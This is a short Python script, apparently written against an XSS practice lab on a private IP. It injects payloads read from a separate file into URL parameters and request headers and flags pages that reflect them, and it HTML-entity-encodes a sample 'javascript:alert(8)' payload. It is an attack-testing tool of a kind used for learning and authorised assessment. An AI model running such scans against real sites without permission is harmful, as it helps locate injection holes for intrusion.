import requests


# 实现HTML实体字符转化功能
def str_html(source):
    str = ''
    for char in source:
        str += '&#x' + hex(ord(char)) + ';'
    return str.replace('0x', '')


# 从响应检测Payload是否有效
def check_resp(response, payload, type):
    index = response.find(payload)  # 找出payload在响应字符串中的位置下标
    prefix = response[index-2:index-1]
    if index >= 0 and (type == 'Normal' or type == 'Replace') and prefix != '=':
        return True
    elif index >= 0 and (type == 'Prop' or type == 'Referer' or type == 'User-Agent' or
                         type == 'Cookie' or type == 'Escape') and prefix == '=':
        return True

    return False


def xss_scann(location):
    url = location.split('?')[0]
    param = location.split('?')[1].split('=')[0]
    level = location.split('?')[0].split('/')[-1].split('.')[0]

    with open('./xss-payload.txt') as f:
        payload_list = f.readlines()

    for line in payload_list:
        type = line.strip().split(':', 1)[0]        # 仅对第一个 : 进行拆分
        payload = line.strip().split(':', 1)[1]
        if type == 'Normal' or type == 'Prop' or type == 'Replace' or type == 'Escape':
            if type == "Escape":
                payload = str_html(payload)
            resp = requests.get(url=url, params={param: payload})   # 给定GET请求的URL地址，参数名和参数值

            if check_resp(resp.text, payload, type):
                print(f"{level} 存在XSS漏洞：{param}={payload}")

        elif type == 'Referer' or type == 'User-Agent' or type == 'Cookie':
            resp = requests.get(url=url, headers={type: payload})   # 设置请求头
            if type == 'Cookie':
                payload = payload.split('=', 1)[1]
            if check_resp(resp.text, payload, type):
                print(f"{level} 存在XSS漏洞：{line.strip()}")


if __name__ == '__main__':
    pass
    xss_scann('http://192.168.43.127/xss/level1.php?name=test')
    xss_scann('http://192.168.43.127/xss/level2.php?keyword=test')
    xss_scann('http://192.168.43.127/xss/level3.php?keyword=test')
    xss_scann('http://192.168.43.127/xss/level4.php?keyword=test')
    xss_scann('http://192.168.43.127/xss/level5.php?keyword=test')
    xss_scann('http://192.168.43.127/xss/level6.php?keyword=test')
    xss_scann('http://192.168.43.127/xss/level8.php?keyword=test')
    xss_scann('http://192.168.43.127/xss/level10.php?t_sort=test')
    xss_scann('http://192.168.43.127/xss/level11.php?keyword=test')
    xss_scann('http://192.168.43.127/xss/level12.php?keyword=test')
    xss_scann('http://192.168.43.127/xss/level13.php?keyword=test')
    xss_scann('http://192.168.43.127/xss/level16.php?keyword=test')
    print(str_html("javascript:alert(8)"))
